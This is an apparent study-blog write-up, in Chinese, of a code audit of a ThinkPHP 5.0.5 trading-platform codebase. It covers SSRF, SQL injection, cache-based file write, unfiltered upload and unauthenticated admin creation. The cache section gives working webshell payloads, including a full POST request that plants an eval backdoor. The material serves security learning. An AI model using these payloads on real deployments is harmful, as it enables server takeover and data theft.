引用自：[面向ThinkPHP框架的代码审计思路流程—某多语言微盘系统](https://mp.weixin.qq.com/s/4xJjVpSyhtt_CyzuHFut6A)
声明：本文仅用于本人自身学习，发在博客内记录自己的学习过程。
# 初识tp框架

## 经典 ThinkPHP 项目目录结构

| 目录名               | 作用说明                         |  常见内容                                                 |
| ----------------- | ---------------------------- | ----------------------------------------------------- |
| `application/`    | **业务逻辑核心**：控制器、模型、视图、配置、路由   | `index/controller/Login.php`、`route.php`、`config.php` |
| `thinkphp/`       | **框架核心代码**：由官方维护，不要修改        | `start.php`、`library/think/Controller.php`            |
| `vendor/`         | **Composer 第三方依赖**：自动加载器和外部库 | `autoload.php`、`topthink/framework`                   |
| `public/`         | **入口目录**：对外暴露的 Web 根目录       | `index.php`、静态资源、`.htaccess`                          |
| `runtime/`        | **运行时缓存目录**：日志、模板编译、临时文件     | `cache/`、`log/`、`temp/`                               |
| `static/`         | **静态资源目录**：CSS、JS、图片等前端文件    | `css/`、`js/`、`images/`                                |
| `staticnewlogin/` | **自定义静态资源目录**：可能是登录页面的样式资源   | `login.css`、`login.js`                                |
| `.well-known/`    | **安全验证目录**：用于 SSL、CA 验证等     | `acme-challenge/`                                     |
| `.htaccess`       | **Apache 伪静态规则文件**           | RewriteCond、RewriteRule 等                             |
| `index.php`       | **应用入口文件**：加载框架并启动项目         | `require './thinkphp/start.php'`                      |
| `index.html`      | **默认静态页**：可能是占位或跳转页          | 通常可删除或重命名                                             |
| `404.html`        | **自定义 404 页面**               | 页面未找到时显示的内容                                           |


注意:
正常来说入口index.php放在public/目录下,这个项目相对特殊



##  核心目录

### `application/`

- 控制器：`controller/` 目录下是你写的业务逻辑，如 `Login.php`
    
- 模型：`model/` 目录下是数据库交互类
    
- 视图：`view/` 目录下是模板文件（HTML）
    
- 路由：`route.php` 定义 URL 映射规则
    
- 配置：`config.php` 是项目级配置文件
    

### `thinkphp/`

- 框架启动：`start.php` 是入口文件加载器
    
- 核心类库：如 `think\Controller`、`think\Db`
    
- 不建议修改，升级框架时替换整个目录即可
    

### `vendor/`

- Composer 自动加载器：`autoload.php`
    
- 第三方库：如 `topthink/framework`、`monolog` 等
    
- 通过 `composer.json` 管理依赖
    

### `public/`

- 对外暴露的目录，Web 服务器根目录应指向这里
    
- `index.php` 是入口文件，加载框架并启动应用
    
- `.htaccess` 用于 Apache 的伪静态配置

项目逻辑主要在 application/admin/下



#  面向ThinkPHP框架的代码审计思路流程—某多语言微盘系统


# 0x01 首先我们先扫一下，有没有之前人留下的后门

![[Pasted image 20251120132350.png]]
.sys.php
明显是别人种的木马


# 0x02 确定TP版本
## 白盒审计

全局搜索`THINK_VERSION` 快速定位 ThinkPHP 的版本信息
该常量通常定义在 `thinkphp/base.php` 文件中。
![[Pasted image 20251120132518.png]]
如图所示 5.0.5（肯定是由框架洞的）


## 黑盒审计

在黑盒测试场景下，如果目标应用在 `application/config.php` 中将 `app_debug` 配置项设为 `true`，那么当 ThinkPHP 程序运行过程中发生错误时，框架也会输出详细的调试信息——其中通常就包含具体的 ThinkPHP 版本号。![[Pasted image 20251120133040.png]]
因为在TP框架中一个 URL 通常会被解析为：
```
http://域名/模块/控制器/方法
```
例如：
```
http://example.com/index/user/login
```
这会映射到：

模块：`index`
控制器：`UserController`（文件路径：`application/index/controller/User.php`） 
方法：`login()`（控制器类中的一个 `public` 方法）


我们可以在源码的
`http://example.com/   index   /user /login`
              `   /application/index/controller/方法`
(上面一一对应)

这个路径下看到![[Pasted image 20251120133642.png]]
如果其中没有login方法，在debug开启的前提下就会暴露TP版本![[Pasted image 20251120133955.png]]
但正常非开发环境应该不会开debug的吧...？


# 0x03 代码审计

## 一、前置知识
### 1.如何定位代码、功能点？

ThinkPHP 是一个基于 MVC 架构的 Web 开发框架。
MVC（Model-View-Controller）是一种主流的软件设计模式，其核心目标是将 Web 应用程序划分为三个职责明确的部分：
**模型（Model）**、**视图（View）** 和 **控制器（Controller）**。

MVC 模式的核心价值在于**实现系统的解耦**——即将原本紧密耦合的功能模块分离为相对独立的组件。通过这种分层设计，各部分可以专注于自身的职责：
**Model 负责数据与业务逻辑，View 负责用户界面展示，Controller 则协调两者之间的交互。**

核心业务通常放在**application 目录下**
这点在初识TP框架中已经提到了

**Model:**

代表应用程序的数据、状态和业务逻辑。

**View:**

负责用户界面的呈现和布局。

**Controller:**

作为模型和视图之间的协调者。

这套源码中并未定义 Model 层，严格来说，其结构更接近于 **VC（View-Controller）** 模式，而非完整的 MVC。这在实际开发中并不少见——许多开发者出于效率或习惯，倾向于“怎么快怎么写”，直接在 Controller 中操作数据库。

具体到本项目，所有的数据库增删改查操作都是在控制器中通过直接获取数据库连接完成的，并未为每张数据表创建对应的模型类进行封装。因此，如果你看到这类代码，不必感到意外。虽然这种做法偏离了 MVC 的设计初衷，但在实际项目中，尤其是中小型或快速迭代的系统中，确实相当普遍。

![[Pasted image 20251120135201.png]]

因此，在审计第三方开发者基于 ThinkPHP 框架构建的 Web 应用时，**最需要重点关注的代码通常位于 `application` 目录下**。该目录下的每个子文件夹一般对应一个**模块（Module）**，用于组织特定功能的控制器、视图等组件。

![[Pasted image 20251120135427.png]]
这就是application下的目录结构

#### 模块
其中 `index/ admin/   common/`是模块
common是特殊模块

| 目录名       | 说明                          |
| --------- | --------------------------- |
| `index/`  | 默认前台模块，通常处理用户访问逻辑（面向客户）     |
| `admin/`  | 后台模块，用于管理后台功能（面向开发者）        |
| `common/` | 通常用于放置公共函数、公共模型，不是完整 MVC 模块 |
##### 判断标准

| 判断标准                   | 是否模块  |
| ---------------------- | ----- |
| 是否包含 `controller/` 子目录 | ✅ 是模块 |
| 是否用于 MVC 结构（控制器/模型/视图） | ✅ 是模块 |

#### 其他
`extra/`是配置目录，用于存放额外配置文件，如支付、短信等
`lang/`语言包目录，存放多语言翻译文件，不是模块

下面的就是配置文件了

---

审计时应优先深入这些模块，尤其是其控制器（Controller）中的方法，因为业务逻辑和潜在的安全风险（如输入校验缺失、危险函数调用等）往往集中于此。


## 2.什么是控制器? 方法?

模块目录下的controller目录对应该模块下的控制器集合，一个PHP文件代表一个控制器，index模块下的控制器有Api、Base、Order、Pay….等等。

![[Pasted image 20251120140304.png]]
那么，当我们访问一个 ThinkPHP 应用时，请求是如何最终调用到控制器中的具体方法的呢？

这就需要了解 ThinkPHP 的**路由机制**。以 ThinkPHP 5（TP5）为例（不同版本在细节上略有差异），框架默认采用一种“约定优于配置”的路由方式：

当收到一个 HTTP 请求时，TP5 会根据 URL 路径自动解析出对应的**模块（module）**、**控制器（controller）** 和**操作方法（action）**，并据此实例化控制器类、调用指定方法。而并不需要我们自己写配置文件来配置路由。
这一点上面已经提过了

## 3.TP 路由规则

TP5的默认路由规则是:
```
http://server/module/controller/action/param/value......
```

例如要调用Index模块下Goods控制器的goods方法就要这样访问:

`http://192.168.10.23/index/goods/goods/参数名/参数值......`
（注意控制器在原代码中首字母要大写，但写在路由中小写）

这里也体现了框架的强大之处，**路由**，传统的PHP项目将功能映射为**单个文件**，这样的项目难以阅读。

通过框架，可以将具体的功能映射到控制器中的某个方法。通过规定好的访问方式，我们可以访问到具体的控制器方法。这些都是TP在底层为我们实现的，访问这个路由时，TP核心代码解析路由，创建对应的控制器(类)实例，调用对应方法(Action)。

---
因此，对于基于 ThinkPHP 等 MVC 框架开发的 Web 项目，**安全审计的核心在于审查控制器（Controller）及其方法（Action）中的业务逻辑**。我们的主要关注点应聚焦于这些方法内部是否存在安全问题

此外，还有一种情况是发现了 ThinkPHP 框架自身核心功能中的漏洞（即“挖框架洞”），这通常属于高阶研究范畴，需要对框架底层有深入理解。此类问题先不讨论。

归根结底，**绝大多数常规 Web 漏洞的本质都是：外部可控的输入 → 参数校验处理不足或未处理 → 流向危险函数**。只要危险函数的参数能够被攻击者间接或直接控制，就可能形成可利用的安全漏洞。 在实际审计过程中，寻找这类漏洞通常有两种主流方法：

1. **通读代码**：从入口开始，逐层跟踪数据流，理解业务逻辑并识别风险点；
 
2. **全局搜索危险函数**（如 `eval()`、`system()`、`file_put_contents()` 等），然后逆向分析其参数是否可能由用户输入控制。


# 开始我的挖洞之旅~

## example~
文章中给了几个漏洞
我来复现一下

###  0x01-SSRF(服务端请求伪造)

文件:

**\application\index\controller\Api.php**
![[Pasted image 20251120144017.png]]
控制器中定义的Public属性方法是可以是外部可以直接访问调用的，方法的参数对应着请求时候需要传入的参数，例如curlfun方法中的、params、对应了请求时需要传递的参数。这里没有对传递的URL参数进行任何过滤，导致可以伪造服务端发起任意请求，这里还可以控制请求的类型。这里可以通过file协议读取任意文件。

从而实现ssrf
复现如下
![[Pasted image 20251120144212.png]]
![[Pasted image 20251120144934.png]]

### 0x02 SQL 注入

在`application/index/Goods.php`中的goods方法
![[Pasted image 20251120220014.png]]
这里，使用的是input函数来接受参数
![[Pasted image 20251120220048.png]]
input可以接受get post等各种参数

这里的$pid可控，所以我们找找能否利用

先看GetProData方法![[Pasted image 20251120220212.png]]
很干净啊，都是直接传参到模板中，然后进行sql查询
![[Pasted image 20251120220224.png]]
再看看这里
![[Pasted image 20251120220330.png]]
有点长给贴出来了
```php
/**  
 * 验证是否休市  
 * @author lukui  2017-07-16  
 * @param  [type] $pid 产品id  
 */function ChickIsOpen($pid){  
  
    $isopen = 0;  
    $pro = db('productinfo')->where(array('pid'=>$pid))->find();  
  
    //此时时间  
    $_time = time();  
    $_zhou = (int)date("w");  
    if($_zhou == 0){  
        $_zhou = 7;  
    }  
    $_shi = (int)date("H");  
    $_fen = (int)date("i");  
  
  
    if ($pro['isopen']) {  
  
        $opentime = db('opentime')->where('pid='.$pid)->find();  
  
  
        if($opentime){  
            $otime_arr = explode('-',$opentime["opentime"]);  
        }else{  
            $otime_arr = array('','','','','','','');  
        }  
  
        foreach ($otime_arr as $k => $v) {  
            if($k == $_zhou-1){  
                $_check = explode('|',$v);  
                if(!$_check){  
                    continue;  
                }  
  
  
                foreach ($_check as $key => $value) {  
                    $_check_shi = explode('~',$value);  
                    if(count($_check_shi) != 2){  
                        continue;  
                    }  
                    $_check_shi_1 = explode(':',$_check_shi[0]);  
                    $_check_shi_2 = explode(':',$_check_shi[1]);  
                    //开市时间在1与2之间  
                      
                    if($isopen == 1){  
                        continue;  
                    }  
                       
  
                    if( ($_check_shi_1[0] == $_shi && $_check_shi_1[1] < $_fen) ||  
                        ($_check_shi_1[0] < $_shi && $_check_shi_2[0] > $_shi) ||  
                        ($_check_shi_2[0] == $_shi && $_check_shi_2[1] > $_fen)  
                         ){  
  
                        $isopen = 1;  
                    }else{  
  
                        $isopen = 0;  
                    }  
  
                }  
                  
  
  
            }  
        }  
  
    }  
  
    if ($pro['isopen']) {  
        return $isopen;  
  
    }else{  
        return 0;  
    }  
}
```

![[Pasted image 20251120220529.png]]
这里有个`.`
php中.就是拼接的作用

以下是两个正确写法，可以用作对比
```php
db('opentime')->where(['pid' => $pid])->find();

db('opentime')->where('pid', $pid)->find();

```



### 0x03-缓存导致的任意文件写入
`\application\index\controller\Pay.php`

在 ThinkPHP 中，支持将任意内容写入缓存。例如，可以将数据库查询结果缓存起来，从而显著提升系统运行效率。这种做法常见于需要频繁访问相同数据的场景，通过缓存机制有效减轻数据库压力，避免重复查询，是提升应用性能的重要手段之一。

![[Pasted image 20251120224006.png]]
这个cache就是缓存的意思

#### 什么是缓存?

Cache::set用于创建缓存
```php
public function testCache()  
{  
        Cache::set("Message","Hello World");  
}
```
第一次执行这个set后会在
\runtime\cache目录下生成缓存文件
![[Pasted image 20251120225755.png]]

Cache::get用于获取缓存内容


```php
public function testCache()  
{  
        echo Cache::get("Message");  
}
```
#### 1. 文件名 是怎么来的？

- 当你调用 `Cache::set('某个键名', $value)` 时，ThinkPHP 会对 `'某个键名'` 做一次哈希（通常是 `md5`）。
    
- 比如：
    
    
  ```
      md5('product_101') = 3a8e4c06e471595f6eb262bb...
    ```
    
- 然后它会取前两位 `3a`，作为子目录名。
    
- 所以这个 `3a` 是 **缓存键的哈希值前两位**，用于分散存储。
    

#### 2. 缓存文件名是怎么来的？

- 文件名通常是完整的哈希值，比如：
    
    代码
    
    ```
    8e4c06e471595f6eb262bb
    ```
    
- 这个文件里存的是你缓存的值（可能是序列化后的 PHP 数据）。

根据缓存名(name)获取到对应变量(创建是将PHP对象序列化为字符串，获取是将序列化的字符串反序列化为PHP对象)


---


跟进到TP核心代码\think\cache\driver\File  中的set（创建文件缓存对应的函数）
```php
public function set($name, $value, $expire = null)  
{  
    if (is_null($expire)) {  
        $expire = $this->options['expire'];  
    }  
    $filename = $this->getCacheKey($name);  
    if ($this->tag && !is_file($filename)) {  
        $first = true;  
    }  
    $data = serialize($value);  
    if ($this->options['data_compress'] && function_exists('gzcompress')) {  
        //数据压缩  
        $data = gzcompress($data, 3);  
    }  
    $data   = "<?php\n//" . sprintf('%012d', $expire) . $data . "\n?>";  
    $result = file_put_contents($filename, $data);  
    if ($result) {  
        isset($first) && $this->setTagItem($filename);  
        clearstatcache();  
        return true;  
    } else {  
        return false;  
    }  
}
```

getCacheKey用于生成文件名，跟进可以看到取name参数MD5的前两位作为文件夹名，其余作为缓存文件名称。
```php
protected function getCacheKey($name)  
{  
    $name = md5($name);  
    if ($this->options['cache_subdir']) {  
        // 使用子目录  
        $name = substr($name, 0, 2) . DS . substr($name, 2);  
    }  
    if ($this->options['prefix']) {  
        $name = $this->options['prefix'] . DS . $name;  
    }  
    $filename = $this->options['path'] . $name . '.php';  
    $dir      = dirname($filename);  
    if (!is_dir($dir)) {  
        mkdir($dir, 0755, true);  
    }  
    return $filename;  
}
```
生成缓存的逻辑是将传入的数据序列化再写入到php文件，获取缓存是根据name的md5计算，找到对应的文件进行反序列化还原。

但是序列化后可以通过传入时构造恶意payload逃逸缓存文件的闭合，使恶意代码被解析。
![[Pasted image 20251121231116.png]]

所以我们不能把文件入口放在根目录，否则可以include这个日志文件就有include点了。
这里的缓存传参的$value刚好我们可以直接get传参来控制，这样我们可以利用刚刚说的逃逸闭合来写马
![[Pasted image 20251121233023.png]]![[Pasted image 20251121233115.png]]

传参payload为`?orderid=%0D%0A@eval($_POST[%270%27]);phpinfo();//;`

注意！这里`%0D%0A`是回车和换行
！！！
![[Pasted image 20251122004030.png]]
复现成功

---
### 0x03.1
由此启发
在/application/admin/controller/System.php下的
![[Pasted image 20251122004906.png]]
我们又看到了可以写内存的地方
所以我们同理传入![[Pasted image 20251122004950.png]]
![[Pasted image 20251122005010.png]]
可以上马

但是这里不知道为什么如果payload中只传入`webname=0D%0A@eval($_POST[%270%27]);phpinfo();//;`
日志文件中不会换行![[Pasted image 20251122005201.png]]
![[Pasted image 20251122005154.png]]

所以搞了搞反正前面加上正常的字符串即可payload如下
```
POST /admin/system/setbasic.html HTTP/1.1



webisopen=on&webname=1111%0D%0A@eval($_POST[%270%27]);phpinfo();//;&pagenum=100&daygiveint=100&inttomoney=100%3A1&id=1&closswebcon=%E7%BD%91%E7%AB%99%E5%8D%87%E7%BA%A7%E7%BB%B4%E6%8A%A4%E4%B8%AD%E2%80%A6%E2%80%A6
```


### 0x04 文件上传漏洞

在
`\application\admin\controller\System.php`中的`homepic`方法

![[Pasted image 20251122101507.png]]
可以看到这个文件上传写的很屎没有任何过滤，并且文件路径我们已知。在public目录中我们也可以访问的到。

### 0x05随意更改密码，创建管理员用户
![[Pasted image 20251122103120.png]]
system下的这个方法，无需校验身份即可添加管理员，并且在已知用户uid的前提下可以随意修改用户的密码

---


